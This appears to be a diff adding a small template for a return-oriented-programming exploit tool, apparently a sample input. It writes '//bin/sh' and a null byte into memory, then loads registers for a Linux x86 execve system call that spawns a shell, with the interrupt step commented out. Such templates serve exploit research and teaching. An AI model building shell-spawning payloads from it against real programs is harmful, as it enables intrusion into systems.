@@ -1,0 +1,20 @@
+; '//bin/sh' setup
+lc(REG1)
+lc(REG2)
+st(REG2, REG1)
+lc(REG1)
+lc(REG2)
+st(REG2, REG1)
+
+; NULL byte setup
+lc(REG1)
+lc(REG2)
+st(REG2, REG1)
+
+; syscall arguments
+lc(ebx)          ; ebx <- &buf     path
+lc(ecx)          ; ecx <- 0        argv = NULL
+lc(edx)          ; edx <- 0        envp = NULL
+lc(eax)          ; eax <- 11       execve
+
+; raw([int], [0x80], [], [eax, ebx, ecx, edx]) ; Commented, as it is usually not a gadget
